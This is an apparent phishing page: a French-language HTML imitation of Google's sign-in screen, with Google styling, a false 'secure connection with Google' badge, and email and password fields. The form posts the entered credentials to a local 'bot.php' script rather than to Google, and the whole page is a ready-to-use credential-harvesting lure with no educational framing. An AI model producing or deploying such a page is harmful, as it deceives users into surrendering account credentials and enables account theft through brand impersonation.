<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Se connecter - Google</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
        
        body {
            margin: 0;
            padding: 0;
            font-family: 'Roboto', Arial, sans-serif;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
        }
        .container {
            width: 100%;
            max-width: 450px;
            padding: 40px 35px;
            text-align: center;
        }
        .logo {
            height: 75px;
            margin-bottom: 25px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin: 0 0 10px;
        }
        .subtitle {
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 30px;
        }
        form {
            text-align: left;
        }
        input {
            width: 100%;
            padding: 16px 14px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            margin-bottom: 25px;
            outline: none;
        }
        input:focus {
            border: 2px solid #1a73e8;
            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .btn:hover {
            background: #185abc;
        }
        .footer {
            margin-top: 35px;
            font-size: 12px;
            color: #70757a;
        }
        .footer a {
            color: #1a73e8;
            text-decoration: none;
            margin: 0 8px;
        }
        .secure {
            color: #34a853;
            font-size: 14px;
            margin: 15px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        
        
        <h1>Se connecter</h1>
        <p class="subtitle">Utilisez votre compte Google</p>
        
        <form action="bot.php" method="POST">
            <input type="email" name="email" id="email" placeholder="Adresse e-mail ou téléphone" required autofocus>
            <input type="password" name="password" id="password" placeholder="Mot de passe" required>
            
            <div class="secure">🔒 Connexion sécurisée avec Google</div>
            
            <button type="submit" class="btn">Suivant</button>
        </form>
        
        <div class="footer">
            <a href="#">Créer un compte</a>
            <a href="#">Besoin d'aide ?</a><br><br>
            <a href="#">Confidentialité</a>
            <a href="#">Conditions d'utilisation</a>
        </div>
    </div>

    <script>
        // Petit script pour simuler un délai réaliste
        document.querySelector('form').addEventListener('submit', function(e) {
            const email = document.getElementById('email').value;
            if (!email.includes('@')) {
                alert("Veuillez entrer une adresse e-mail valide.");
                e.preventDefault();
            }
        });
    </script>
</body>
</html>
